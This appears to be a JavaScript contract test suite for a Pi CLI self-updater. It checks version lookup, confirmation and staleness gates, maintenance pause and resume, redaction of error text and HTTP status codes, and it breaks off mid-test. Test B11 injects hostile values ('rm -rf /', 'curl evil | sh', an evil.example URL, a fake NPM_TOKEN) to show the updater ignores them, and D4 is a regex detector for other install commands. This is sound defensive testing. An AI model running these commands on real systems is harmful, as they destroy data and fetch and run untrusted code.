/* Pi 运行时更新（Built-in Pi Updater）契约测试。
 *
 * 完全离线：**不联网、不跑真实 pi、不碰全局 npm、不读用户真实数据**。
 * 检查用的 fetch 与 updater 用的 runner 全部是注入的替身；bridge 用假子进程。
 *
 * 用法：node tests/pi-update.cjs
 *
 * 分七段（与任务书 A–G 对应）：
 *   A. 检查（TTL / 单飞 / force / 超时 / 网络 / 离线 / 形状 / 包名 / 隐私）
 *   B. 更新动作（确认 / 过期 / no-op / 固定参数 / 任意参数无效 / 闸门 / 并发）
 *   C. maintenance（停得干净、不自动重启、resume 只启动一次、失败也 resume）
 *   D. 身份（entry 只解析一次并一路传递；解析不出来就拒绝，不 fallback）
 *   E. 缓存失效与版本复验（退出码 0 ≠ 完成）
 *   F. 静态边界（这个模块里不可能出现别的安装方式）
 */
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { EventEmitter } = require('node:events');
const { PassThrough } = require('node:stream');

let pass = 0;
let fail = 0;
function check(name, cond, extra) {
  const ok = typeof cond === 'function' ? cond() : cond;
  if (ok === true) {
    pass++;
    console.log('  ok   ' + name);
  } else {
    fail++;
    console.log('  FAIL ' + name + (ok ? '  → ' + ok : extra ? '  → ' + extra : ''));
  }
}
function section(t) {
  console.log('\n--- ' + t + ' ---');
}
const tick = () => new Promise((r) => setTimeout(r, 0));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** 假子进程（与 tests/reliability.cjs 同一套：stdin/stdout/stderr + kill 触发 exit）。 */
function fakeChild() {
  const child = new EventEmitter();
  child.stdin = new PassThrough();
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  child.pid = Math.floor(Math.random() * 100000) + 1;
  child.kills = 0;
  child.kill = () => {
    child.kills++;
    process.nextTick(() => child.emit('exit', 0, 'SIGTERM'));
  };
  return child;
}

(async () => {
  const mod = await import('../server/pi-update.js');
  const { createPiUpdate, isOffline, LATEST_VERSION_URL, PI_PACKAGE, PHASES } = mod;
  const { createRpcBridge } = await import('../server/rpc-bridge.js');
  const { createRuntime } = await import('../server/runtime.js');

  const okFetch = (version = '1.0.0', packageName = PI_PACKAGE) => async (url, init) => ({
    ok: true,
    status: 200,
    json: async () => ({ ok: true, version, packageName }),
    _init: init,
  });

  /**
   * 造一个 pi-update 实例 + 观察窗。所有外部依赖都是替身。
   * @param opts.clock 可控时钟（TTL 测试用）
   */
  function harness({
    current = '0.99.2',
    verification = 'unverified',
    env = {},
    fetchImpl = null,
    resolveOk = true,
    runResult = { ok: true, exitCode: 0 },
    afterUpgrade = null,
    busy = null,
    pause = { ok: true },
    currentCwd = null,
    ttlMs = 30 * 60 * 1000,
    /* 让 updater 卡住不返回：用来在「更新中」采样 GET 的真实相位。 */
    runGate = null,
  } = {}) {
    let clock = 1_700_000_000_000;
    const state = {
      current,
      calls: [],
      runArgs: [],
      runOpts: [],
      paused: 0,
      resumed: 0,
      invalidated: 0,
      resolved: 0,
      sequence: [],
      /* 在关键钩子上顺手记下「那一刻的相位」——比事后猜可靠。 */
      phaseAt: {},
      advance: (ms) => {
        clock += ms;
      },
    };
    const entry = { kind: 'node', cmd: process.execPath, baseArgs: ['/pkg/dist/bundle/cli.js'], ok: true };
    const update = createPiUpdate({
      env,
      guiVersion: '0.17.0',
      now: () => clock,
      ttlMs,
      readVersion: (opts = {}) => {
        state.sequence.push(opts.force ? 'read:force' : 'read');
        return { value: state.current, source: 'package.json', status: 'known', verification };
      },
      resolveUpdaterTarget: () => {
        state.resolved += 1;
        return resolveOk ? { ok: true, entry } : { ok: false, code: 'no-proven-entry' };
      },
      runUpdater: async (args, opts) => {
        state.runArgs.push(args);
        state.runOpts.push(opts);
        if (runGate) await runGate;
        if (afterUpgrade !== null) state.current = afterUpgrade;
        if (runResult instanceof Error) throw runResult;
        return runResult;
      },
      pauseBridge: async () => {
        state.paused += 1;
        return pause;
      },
      resumeBridge: () => {
        state.resumed += 1;
        state.phaseAt.resume = update.snapshot().phase;
        return { ok: true };
      },
      invalidateCaches: () => {
        state.invalidated += 1;
        state.phaseAt.invalidate = update.snapshot().phase;
        state.sequence.push('invalidate');
      },
      busyReason: typeof busy === 'function' ? busy : () => busy,
      currentCwd: currentCwd ? () => currentCwd() : null,
      fetchImpl: async (url, init) => {
        state.calls.push({ url, init });
        return (fetchImpl || okFetch())(url, init);
      },
    });
    return { update, state, entry };
  }

  /* ================= A. 检查 ================= */
  section('A. 检查（只读、固定 endpoint、白名单）');

  {
    const { update, state } = harness();
    const s = await update.readStatus({});
    check('A1. 0.99.2 → 1.0.0：updateAvailable=true / canUpdate=true', () =>
      (s.ok === true && s.updateAvailable === true && s.canUpdate === true && s.latestVersion === '1.0.0') || JSON.stringify(s));
    check('A2. 带上当前版本与核对状态（前端要用它显示未验收警告）', () =>
      (s.currentVersion === '0.99.2' && s.verification === 'unverified') || JSON.stringify(s));
    check('A3. packageName 是官方包名', () => s.packageName === PI_PACKAGE || s.packageName);
    check('A4. 请求打的是固定 URL，且不带任何本机信息', () => {
      const c = state.calls[0];
      if (!c) return '没有发出请求';
      if (c.url !== LATEST_VERSION_URL) return c.url;
      if (/\?|cwd|session|model|provider|project/i.test(c.url)) return c.url;
      return true;
    });
    check('A5. 请求头只有 Accept 与 User-Agent（无 cookie / token / referer）', () => {
      const h = (state.calls[0].init && state.calls[0].init.headers) || {};
      const keys = Object.keys(h).sort();
      if (JSON.stringify(keys) !== JSON.stringify(['Accept', 'User-Agent'])) return JSON.stringify(keys);
      if (!/^pi-gui\/0\.17\.0$/.test(h['User-Agent'])) return h['User-Agent'];
      return true;
    });
    check('A6. GET、无 body、带超时信号', () => {
      const init = state.calls[0].init;
      return (init.method === 'GET' && init.body === undefined && Boolean(init.signal)) || JSON.stringify({ m: init.method, b: init.body, s: Boolean(init.signal) });
    });
    check('A7. 响应字段严格落在白名单里', () => {
      const allowed = new Set(['ok', 'phase', 'currentVersion', 'latestVersion', 'packageName', 'updateAvailable', 'verification', 'canUpdate', 'reason', 'cached', 'installedVersion', 'errorCode', 'error', 'checkedAt', 'running']);
      const extra = Object.keys(s).filter((k) => !allowed.has(k));
      return extra.length === 0 || JSON.stringify(extra);
    });
  }

  {
    const { update, state } = harness({ current: '1.0.0' });
    const s = await update.readStatus({});
    check('A8. 已是最新：updateAvailable=false / phase=latest / canUpdate=false', () =>
      (s.updateAvailable === false && s.phase === 'latest' && s.canUpdate === false && s.reason === 'latest') || JSON.stringify(s));
    check('A9. 已是最新时 canUpdate=false、reason=latest（按钮不该出现）', () =>
      (s.canUpdate === false && s.reason === 'latest') || JSON.stringify({ canUpdate: s.canUpdate, reason: s.reason }));
  }

  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ nope: 1 }) }) });
    const s = await update.readStatus({});
    check('A10. 响应形状不认识 → invalid-response，且不冒充新版本', () =>
      (s.ok === false && s.errorCode === 'invalid-response' && s.updateAvailable !== true) || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, version: '1.0.0', packageName: '@someone-else/pi' }) }) });
    const s = await update.readStatus({});
    check('A11. 陌生 packageName → foreign-package（绝不据此更新）', () =>
      (s.ok === false && s.errorCode === 'foreign-package') || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, version: 'not-a-version', packageName: PI_PACKAGE }) }) });
    const s = await update.readStatus({});
    check('A12. 版本号不合法 → invalid-response', () => (s.ok === false && s.errorCode === 'invalid-response') || JSON.stringify(s));
  }
  {
    const abort = new Error('aborted');
    abort.name = 'AbortError';
    const { update } = harness({ fetchImpl: async () => { throw abort; } });
    const s = await update.readStatus({});
    check('A13. 超时 → errorCode=timeout', () => (s.ok === false && s.errorCode === 'timeout') || JSON.stringify(s));
  }
  {
    const { update } = harness({ fetchImpl: async () => { throw new Error('ENOTFOUND'); } });
    const s = await update.readStatus({});
    check('A14. 网络失败 → errorCode=network（结构化失败，不抛）', () =>
      (s.ok === false && s.errorCode === 'network') || JSON.stringify(s));
  }
  {
    const { update, state } = harness({ fetchImpl: async () => ({ ok: false, status: 503, json: async () => ({}) }) });
    const s = await update.readStatus({});
    check('A15. 非 2xx → http-error', () => (s.ok === false && s.errorCode === 'http-error') || JSON.stringify(s));
    check('A16. 失败不进缓存（下次仍会重试）', () => state.calls.length === 1 || state.calls.length);
    const s2 = await update.readStatus({});
    check('A17. 失败之后再次检查仍会真的发请求', () =>
      (state.calls.length === 2 && s2.ok === false) || JSON.stringify({ calls: state.calls.length }));
  }
  {
    const { update, state } = harness({ env: { PI_OFFLINE: '1' } });
    const s = await update.readStatus({});
    check('A18. PI_OFFLINE=1 → 完全不发请求，返回 offline', () =>
      (state.calls.length === 0 && s.ok === false && s.errorCode === 'offline') || JSON.stringify({ calls: state.calls.length, s }));
    check('A19. isOffline() 认 1/true/yes/on，不认空与 0', () =>
      (isOffline({ PI_OFFLINE: '1' }) && isOffline({ PI_OFFLINE: 'true' }) && isOffline({ PI_OFFLINE: 'YES' }) &&
        !isOffline({}) && !isOffline({ PI_OFFLINE: '0' }) && !isOffline({ PI_OFFLINE: '' })) || '判定不对');
  }
  {
    const { update, state } = harness();
    const a = await update.readStatus({});
    const b = await update.readStatus({});
    check('A20. TTL 内第二次检查走缓存（只有一次网络）', () =>
      (state.calls.length === 1 && b.cached === true && a.cached === false) || JSON.stringify({ calls: state.calls.length, a: a.cached, b: b.cached }));
    state.advance(31 * 60 * 1000);
    await update.readStatus({});
    check('A21. TTL 过期后重新检查（缓存不是永久的）', () => state.calls.length === 2 || state.calls.length);
    await update.readStatus({ force: true });
    check('A22. force=1 绕过缓存', () => state.calls.length === 3 || state.calls.length);
  }
  {
    const { update, state } = harness();
    const [a, b] = await Promise.all([update.readStatus({}), update.readStatus({})]);
    check('A23. 并发检查单飞：只打一次公网，两边都拿到结果', () =>
      (state.calls.length === 1 && a.updateAvailable === true && b.updateAvailable === true) || JSON.stringify({ calls: state.calls.length }));
  }
  {
    const { update } = harness();
    check('A24. 相位集合是前端认的那几个', () =>
      PHASES.every((p) => typeof p === 'string') && PHASES.includes('updating') && PHASES.includes('verifying') && PHASES.includes('restarting'));
  }

  /* ================= B. 更新动作 ================= */
  section('B. 更新动作（确认 / 过期 / 固定参数 / 闸门）');

  const good = () => ({ action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0' });

  {
    const { update, state } = harness();
    const r = await update.runUpdate({ action: 'update' });
    check('B1. confirm !== true → 拒绝（confirm-required），不暂停也不跑 updater', () =>
      (r.ok === false && r.code === 'confirm-required' && state.paused === 0 && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness();
    const r = await update.runUpdate({ ...good(), action: 'delete-everything' });
    check('B2. 只认 action=update', () => (r.ok === false && r.code === 'bad-action' && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness();
    const r = await update.runUpdate({ ...good(), expectedCurrentVersion: '0.99.0' });
    check('B3. 当前版本与后端重读的不一致 → stale-current，不跑 updater', () =>
      (r.ok === false && r.code === 'stale-current' && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update } = harness({ fetchImpl: okFetch('1.2.0') });
    const r = await update.runUpdate(good());
    check('B4. 目标版本已经变了 → stale-target（要求前端刷新）', () =>
      (r.ok === false && r.code === 'stale-target') || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ current: '1.0.0' });
    const r = await update.runUpdate({ ...good(), expectedCurrentVersion: '1.0.0' });
    check('B5. 没有新版本 → no-update，**不起子进程**', () =>
      (r.ok === false && r.code === 'no-update' && state.runArgs.length === 0 && state.paused === 0) || JSON.stringify(r));
  }
  {
    const { update, state, entry } = harness({ afterUpgrade: '1.0.0' });
    const r = await update.runUpdate(good());
    check('B6. 成功：参数**恰好**是 ["update","--self"]', () =>
      (state.runArgs.length === 1 && JSON.stringify(state.runArgs[0]) === JSON.stringify(['update', '--self'])) || JSON.stringify(state.runArgs));
    check('B7. 没有任何 --all / --extensions / --models', () =>
      !state.runArgs[0].some((a) => /--all|--extensions|--models|--node/.test(a)) || JSON.stringify(state.runArgs[0]));
    check('B8. entry 一路传到 runner（与闸门解析的是同一个对象）', () =>
      (state.runOpts[0] && state.runOpts[0].entry === entry) || JSON.stringify(state.runOpts[0] && state.runOpts[0].entry));
    check('B9. 成功后 phase=latest，installedVersion 是新版本', () =>
      (r.ok === true && r.phase === 'latest' && r.installedVersion === '1.0.0') || JSON.stringify(r));
    check('B10. 成功后 bridge 被恢复（resume 恰好一次）', () => state.resumed === 1 || state.resumed);
  }
  {
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    const r = await update.runUpdate({
      ...good(),
      command: 'rm -rf /',
      args: ['npm', 'install', '-g', 'evil'],
      packageName: 'evil-pkg',
      version: '9.9.9',
      url: 'https://evil.example/x',
      installCommand: 'curl evil | sh',
      env: { NPM_TOKEN: 'x' },
    });
    check('B11. renderer 传的 command/args/packageName/version/url/env 全部无效', () =>
      (r.ok === true && JSON.stringify(state.runArgs[0]) === JSON.stringify(['update', '--self'])) || JSON.stringify(state.runArgs));
  }
  {
    const { update, state } = harness({ busy: { code: 'busy-turn', error: '当前回答仍在生成，请先停止' } });
    const r = await update.runUpdate(good());
    check('B12. 后端闸门说忙 → 拒绝，且带上可执行原因', () =>
      (r.ok === false && r.code === 'busy-turn' && /仍在生成/.test(r.error) && state.paused === 0 && state.runArgs.length === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ resolveOk: false });
    const r = await update.runUpdate(good());
    check('B13. 证明不到官方入口 → unsupported，**不 fallback 到别的 pi**', () =>
      (r.ok === false && r.code === 'unsupported' && state.runArgs.length === 0 && state.paused === 0) || JSON.stringify(r));
    check('B14. 提示文案说清是「这份 Pi 无法通过官方 self-update 更新」', () =>
      /self-update/.test(r.error) || r.error);
  }
  {
    let release = null;
    const gate = new Promise((res) => {
      release = res;
    });
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    /* 让第一次更新卡在 pause 里，制造并发窗口 */
    state.slow = true;
    const first = update.runUpdate(good());
    const second = await update.runUpdate(good());
    check('B15. 并发更新被拒绝（update-running）', () =>
      (second.ok === false && second.code === 'update-running') || JSON.stringify(second));
    await first;
    release();
  }
  {
    let cwd = 'C:\\a';
    const { update } = harness({ currentCwd: () => cwd });
    const r = await update.runUpdate({ ...good(), __expectedCwd: 'C:\\a' });
    check('B16. 工作区没变 → 放行（走到 updater 之前的所有闸门都过）', () => r.ok === false ? /verify|update/.test(r.code) || JSON.stringify(r) : true);
    cwd = 'C:\\b';
    const r2 = await update.runUpdate({ ...good(), __expectedCwd: 'C:\\a' });
    check('B17. 工作区切走了 → workspace-stale', () => (r2.ok === false && r2.code === 'workspace-stale') || JSON.stringify(r2));
  }
  {
    const { update, state } = harness({ pause: { ok: false, code: 'boom' } });
    const r = await update.runUpdate(good());
    check('B18. 暂停失败 → pause-failed，不跑 updater，也不 resume（那不是我们停的）', () =>
      (r.ok === false && r.code === 'pause-failed' && state.runArgs.length === 0 && state.resumed === 0) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ pause: { ok: false, code: 'already-in-maintenance' } });
    const r = await update.runUpdate(good());
    check('B19. 已经在维护中 → update-running（不嵌套）', () =>
      (r.ok === false && r.code === 'update-running' && state.runArgs.length === 0) || JSON.stringify(r));
  }

  /* ================= C. maintenance（真 bridge） ================= */
  section('C. maintenance：停得干净、不自动重启、resume 只启动一次');

  {
    const children = [];
    const events = [];
    const runtime = createRuntime({ initialCwd: process.cwd() });
    const bridge = createRpcBridge({
      runtime,
      publish: (e) => events.push(e),
      piBin: 'fake-pi',
      isWin: false,
      env: {},
      spawnProcess: () => {
        const c = fakeChild();
        children.push(c);
        return c;
      },
      /* 进程树终止原语是注入点（生产用 agents/cli.js 的 killTree，Windows 走
       * taskkill /T）；假 child 没有 pid/exitCode，所以这里接到它自己的 kill 上。 */
      killProcessTree: (c) => c.kill(),
      restartDelayMs: 0,
    });
    bridge.start();
    children[0].emit('spawn');
    const pending = bridge.request({ type: 'get_commands' }, { timeoutMs: 5000 });

    const pausedPromise = bridge.pauseForMaintenance('pi-update');
    check('C1. 暂停时立刻发 maintenance/pausing', () =>
      events.some((e) => e.type === 'bridge_status' && e.state === 'maintenance' && e.phase === 'pausing') || JSON.stringify(events.slice(-2)));
    const settledPending = await pending;
    check('C2. 挂起请求被安全 settle（不会干等到超时）', () => settledPending === null || JSON.stringify(settledPending));
    check('C3. 当前 child 被要求退出（stdin.end + kill）', () => children[0].kills === 1 || children[0].kills);
    const paused = await pausedPromise;
    check('C4. pauseForMaintenance 等进程真的退出才 resolve', () =>
      (paused.ok === true && paused.stopped === true) || JSON.stringify(paused));
    check('C5. 退出后发 maintenance/stopped，且**没有**自动重启', () =>
      (events.some((e) => e.type === 'bridge_status' && e.state === 'maintenance' && e.phase === 'stopped') &&
        !events.some((e) => e.type === 'bridge_status' && e.state === 'starting' && events.indexOf(e) > 0)) ||
      JSON.stringify(events.filter((e) => e.type === 'bridge_status').map((e) => e.state + ':' + (e.phase || ''))));

    await sleep(30);
    check('C6. 维护期间不会拉起新 child（等一个 backoff 窗口也不动）', () => children.length === 1 || children.length);
    check('C7. 维护期间 send() 被拒绝（不再接受新命令）', () => {
      try {
        bridge.send({ type: 'prompt', message: 'hi' });
        return '居然发出去了';
      } catch (err) {
        return /更新|维护/.test(err.message) || err.message;
      }
    });
    const duringRequest = await bridge.request({ type: 'get_commands' }, { timeoutMs: 200 });
    check('C8. 维护期间 request() 直接回 null', () => duringRequest === null || JSON.stringify(duringRequest));
    const again = await bridge.pauseForMaintenance('pi-update');
    check('C9. 重复 pause → already-in-maintenance（防嵌套）', () =>
      (again.ok === false && again.code === 'already-in-maintenance') || JSON.stringify(again));
    check('C10. 维护态能从 getState() 读出来（刷新页面后前端才显示得对）', () =>
      Boolean(bridge.getState().maintenance && bridge.getState().maintenance.reason === 'pi-update') || JSON.stringify(bridge.getState().maintenance));

    const resumed = bridge.resumeFromMaintenance();
    check('C11. resume 之后正好启动一个新 child', () => (resumed.ok === true && children.length === 2) || JSON.stringify({ r: resumed, n: children.length }));
    check('C12. resume 只发一次 starting', () =>
      events.filter((e) => e.type === 'bridge_status' && e.state === 'starting').length === 2 ||
      events.filter((e) => e.type === 'bridge_status' && e.state === 'starting').length);
    check('C13. 再 resume → not-paused（不会顺手再拉起一个 pi）', () => {
      const r2 = bridge.resumeFromMaintenance();
      return (r2.ok === false && r2.code === 'not-paused' && children.length === 2) || JSON.stringify({ r2, n: children.length });
    });
    check('C14. resume 之后命令重新可用（child 活着）', () => {
      children[1].emit('spawn');
      bridge.send({ type: 'get_state' });
      return true;
    });
    /* 维护不应该污染崩溃退避：维护结束后再来一次「意外退出」，仍按正常崩溃路径重启 */
    const before = events.length;
    children[1].emit('exit', 1, null);
    await sleep(30);
    check('C15. 维护之后的意外退出仍走正常重启（crashStreak 没被维护搞脏）', () =>
      (children.length === 3 && events.slice(before).some((e) => e.state === 'exited')) ||
      JSON.stringify({ n: children.length, tail: events.slice(before).map((e) => e.state) }));
    runtime.setShuttingDown(true);
    bridge.stop();
  }

  /* ================= D. 身份 ================= */
  section('D. 身份：只解析一次、不 fallback');

  {
    const { update, state, entry } = harness({ afterUpgrade: '1.0.0' });
    await update.runUpdate(good());
    check('D1. 解析入口最多两次（一次给 canUpdate 显示、一次给更新），执行时用闸门那次', () =>
      state.resolved <= 2 || state.resolved);
    check('D2. runner 收到的是同一个 entry 对象（不是重新找的一份）', () =>
      state.runOpts[0].entry === entry || 'entry 不一致');
  }
  {
    const src = fs.readFileSync(path.join(__dirname, '..', 'server', 'pi-update.js'), 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/^\s*\/\/.*$/gm, '');
    check('D3. 模块自己不起进程（没有 child_process / spawn / exec）', () =>
      !/child_process|spawn\(|execFile|execSync/.test(src) || '出现了进程启动代码');
    check('D4. 模块里没有别的安装方式（npm/pnpm/bun/curl/--all）', () =>
      !/(^|[^a-z])(npm|pnpm|bun|yarn)\s+(install|add|i)\b|curl\s|--all\b|--extensions\b|--models\b/.test(src) || '出现了别的安装路径');
  }
  {
    const serverSrc = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
    check('D5. server 装配里 CLI 入口来自 launch identity（buildPiEntry(piLaunch.packageDir())）', () => {
      /* P24 起「这份 Pi 的官方 CLI 入口」抽成了一个共享原语
       * （`resolvePiCliEntry()`）—— Pi 自更新与 Capability 安装共用它，
       * 免得两条路各解析一次、又各解析出不同的 pi。所以这里同时钉两件事：
       * 原语本身来自 launch identity，且 updater 接的就是它。 */
      const helper = /function resolvePiCliEntry\(\)[\s\S]{0,400}buildPiEntry\(piLaunch\.packageDir\(\)\)/.test(serverSrc);
      const wired = /resolveUpdaterTarget:\s*\(\)\s*=>\s*resolvePiCliEntry\(\)/.test(serverSrc);
      if (!helper) return '没有从 launch identity 派生 CLI 入口';
      return wired || 'updater 目标没有接到共享的 launch identity 原语上';
    });
    check('D6. 没有「PATH 再找一份 pi」的 fallback 分支（modify 里没有 bin="pi"）', () =>
      !/resolveUpdaterTarget[\s\S]{0,600}['"]pi['"]/.test(serverSrc) || '看起来有 fallback 到裸 pi 的路径');
  }

  /* ================= E. 缓存失效与版本复验 ================= */
  section('E. 缓存失效与版本复验');

  {
    const { update, state } = harness({ afterUpgrade: '1.0.0' });
    await update.runUpdate(good());
    const iInvalidate = state.sequence.indexOf('invalidate');
    const iForceRead = state.sequence.findIndex((s) => s === 'read:force');
    check('E1. 成功路径：先清 identity-bound 缓存，再**强制**重读版本', () =>
      (state.invalidated === 1 && iInvalidate >= 0 && iForceRead > iInvalidate) || JSON.stringify(state.sequence));
    const afterCheck = await update.readStatus({});
    check('E2. 成功之后检查缓存作废（版本已经变了）', () => afterCheck.cached === false || '还命中旧缓存');
  }
  {
    const { update, state } = harness({ afterUpgrade: null });
    const r = await update.runUpdate(good());
    check('E3. updater 退出码 0 但版本没变 → verify-failed（不能说更新成功）', () =>
      (r.ok === false && r.code === 'verify-failed' && r.installedVersion === '0.99.2') || JSON.stringify(r));
    check('E4. 复验失败也必须恢复 bridge（否则永久停在维护态）', () => state.resumed === 1 || state.resumed);
    check('E5. 复验失败时 phase 是 failed', () => update.snapshot().phase === 'failed' || update.snapshot().phase);
  }
  {
    const { update, state } = harness({ runResult: { ok: false, exitCode: 1, stderr: 'npm ERR! code EACCES\n路径 C:\\Users\\someone\\.npmrc 不可写\nTOKEN=abc' } });
    const r = await update.runUpdate(good());
    check('E6. updater 非 0 → update-failed，且恢复 bridge', () =>
      (r.ok === false && r.code === 'update-failed' && state.resumed === 1) || JSON.stringify(r));
    check('E7. 错误文本脱敏（没有绝对路径、没有 token 原值）', () =>
      (!/[A-Za-z]:\\/.test(r.error) && !/TOKEN=abc/.test(r.error)) || r.error);
    check('E8. 只回一句话摘要，不回原始 stderr', () =>
      (typeof r.error === 'string' && r.error.length <= 240 && !/\n/.test(r.error)) || r.error);
  }
  {
    const { update, state } = harness({ runResult: { ok: false, timedOut: true } });
    const r = await update.runUpdate(good());
    check('E9. updater 超时 → update-timeout，且恢复 bridge', () =>
      (r.ok === false && r.code === 'update-timeout' && state.resumed === 1) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ runResult: new Error('spawn EPERM') });
    const r = await update.runUpdate(good());
    check('E10. runner 抛错 → update-spawn-failed / update-failed，且恢复 bridge', () =>
      (r.ok === false && state.resumed === 1 && ['update-spawn-failed', 'update-failed'].includes(r.code)) || JSON.stringify(r));
  }
  {
    const { update, state } = harness({ afterUpgrade: '1.0.0', verification: 'verified' });
    await update.runUpdate(good());
    const snap = update.snapshot();
    check('E11. 快照（诊断用）只含公开字段、不发请求', () => {
      const allowed = new Set(['phase', 'currentVersion', 'latestVersion', 'updateAvailable', 'verification', 'canUpdate', 'reason', 'running', 'cached', 'errorCode']);
      const extra = Object.keys(snap).filter((k) => !allowed.has(k));
      return (extra.length === 0 && snap.running === false) || JSON.stringify(extra);
    });
    check('E12. reset() 之后回到 idle（不残留上一次结论）', () => {
      update.reset();
      return update.snapshot().phase === 'idle' || update.snapshot().phase;
    });
  }

  /* ================= F. HTTP 层（handle） ================= */
  section('F. HTTP 层：方法 / 错误码 / 202 语义');

  {
    const { update } = harness({ afterUpgrade: '1.0.0' });
    const res = { code: 0, body: null };
    const fakeRes = {
      writeHead: (c) => {
        res.code = c;
        return fakeRes;
      },
      end: (b) => {
        res.body = b;
      },
    };
    const json = (r, code, body) => {
      r.writeHead(code);
      r.end(JSON.stringify(body));
    };
    await update.handle({ method: 'PUT', on: () => {}, headers: {} }, fakeRes, new URL('http://x/api/pi-update'), json);
    check('F1. 非 GET/POST → 405 JSON', () => (res.code === 405 && /method-not-allowed/.test(res.body)) || JSON.stringify(res));

    const req = new EventEmitter();
    req.method = 'POST';
    req.headers = {};
    const p = update.handle(req, fakeRes, new URL('http://x/api/pi-update'), json);
    await tick();
    req.emit('data', Buffer.from('{ not json'));
    req.emit('end');
    await p;
    check('F2. 请求体不是 JSON → 400 bad-body', () => (res.code === 400 && /bad-body/.test(res.body)) || JSON.stringify(res));

    const req2 = new EventEmitter();
    req2.method = 'POST';
    req2.headers = {};
    const p2 = update.handle(req2, fakeRes, new URL('http://x/api/pi-update'), json);
    await tick();
    req2.emit('data', Buffer.from(JSON.stringify(good())));
    req2.emit('end');
    await p2;
    check('F3. 合法 POST → 202 accepted + phase=updating（前端据此开始轮询）', () =>
      (res.code === 202 && /"accepted":true/.test(res.body) && /"phase":"updating"/.test(res.body)) || JSON.stringify({ code: res.code, body: res.body }));
    await sleep(20);
    check('F4. 后台跑完后快照变成 latest', () => update.snapshot().phase === 'latest' || update.snapshot().phase);
  }
  {
    const { update } = harness({ env: { PI_OFFLINE: '1' } });
    const res = { code: 0, body: null };
    const json = (r, code, body) => {
      res.code = code;
      res.body = JSON.stringify(body);
    };
    await update.handle({ method: 'GET', headers: {} }, {}, new URL('http://x/api/pi-update'), json);
    check('F5. GET 离线 → 200 + ok:false/offline（业务结果不用 5xx）', () =>
      (res.code === 200 && /"errorCode":"offline"/.test(res.body)) || JSON.stringify(res));
  }

  /* ================= G. 更新期间 / 终态的 GET 语义（blocker 1） =================
   *
   * 这一组就是这次要修的三个真实缺陷里的第一个：
   * 「更新中 GET 回旧 TTL cache（phase=available / running=false）」会让前端
   * 停掉轮询并重新点亮「更新到 1.0.0」按钮；「失败终态被下一次检查覆盖」
   * 则会把真正的失败原因抹掉。 */
  section('G. 更新状态与检查缓存必须分开（GET 语义）');

  {
    /* 让 updater 卡住：在 updating 相位采样 GET */
    let releaseGate;
    const gate = new Promise((r) => {
      releaseGate = r;
    });
    const { update, state } = harness({ afterUpgrade: '1.0.0', runGate: gate });
    const before = await update.readStatus({});
    check('G1. 前置：更新前检查给出 available（这才是可以点的状态）', () =>
      (before.phase === 'available' && before.updateAvailable === true) || JSON.stringify(before));
    const fetchCallsBefore = state.calls.length;

    const started = await update.startUpdate({
      action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0',
    });
    check('G2. POST 被接受（202 语义：accepted + phase=updating）', () =>
      (started.ok === true && started.accepted === true && started.phase === 'updating') || JSON.stringify(started));

    const during = await update.readStatus({});
    check('G3. **更新中 GET 不能回旧缓存**：phase=updating / running=true / canUpdate=false', () =>
      (during.phase === 'updating' && during.running === true && during.canUpdate === false && during.updateAvailable === true) ||
      JSON.stringify(during));
    check('G4. 更新中 GET 不打公网（不重新检查）', () =>
      state.calls.length === fetchCallsBefore || `${fetchCallsBefore} → ${state.calls.length}`);
    check('G5. 更新中 GET 保留本次 update 的 context（当前 0.99.2 → 目标 1.0.0）', () =>
      (during.currentVersion === '0.99.2' && during.latestVersion === '1.0.0') || JSON.stringify(during));

    releaseGate();
    /* 等后台更新跑完 */
    for (let i = 0; i < 100 && update.isRunning(); i++) await new Promise((r) => setTimeout(r, 5));
    const after = await update.readStatus({});
    check('G6. 更新成功后 GET：phase=latest / running=false / installedVersion 是新版本', () =>
      (after.phase === 'latest' && after.running === false && after.installedVersion === '1.0.0' && after.currentVersion === '1.0.0') ||
      JSON.stringify(after));
    check('G7. 成功后 updateAvailable=false（不能再显示「更新到 x」）', () =>
      after.updateAvailable === false || JSON.stringify(after));
    const fetchCallsAfterSuccess = state.calls.length;
    const again = await update.readStatus({});
    check('G8. 成功终态不会被下一次普通 GET 用新检查覆盖', () =>
      (again.phase === 'latest' && state.calls.length === fetchCallsAfterSuccess) || JSON.stringify({ again, calls: state.calls.length }));
    const forced = await update.readStatus({ force: true });
    check('G9. 用户显式 force 检查才允许覆盖终态（并真的打一次公网）', () =>
      (state.calls.length === fetchCallsAfterSuccess + 1 && forced.phase === 'latest') ||
      JSON.stringify({ calls: state.calls.length, forced }));
    check('G10. 相位序列属实：verifying / restarting 都出现过', () =>
      (state.phaseAt.invalidate === 'verifying' && state.phaseAt.resume === 'restarting') || JSON.stringify(state.phaseAt));
  }

  {
    /* 失败终态：绝不能被轮询里的新检查覆盖成 available */
    const { update, state } = harness({
      runResult: { ok: false, exitCode: 1, stderr: 'npm ERR! code EACCES\nC:\\Users\\someone\\.npmrc' },
    });
    await update.readStatus({});
    const r = await update.runUpdate({
      action: 'update', confirm: true, expectedCurrentVersion: '0.99.2', expectedLatestVersion: '1.0.0',
    });
    check('G11. updater 失败 → 结果 ok:false / code=update-failed', () =>
      (r.ok === false && r.code === 'update-failed') || JSON.stringify(r));
    const callsAfterFail = state.calls.length;
    const g1 = await update.readStatus({});
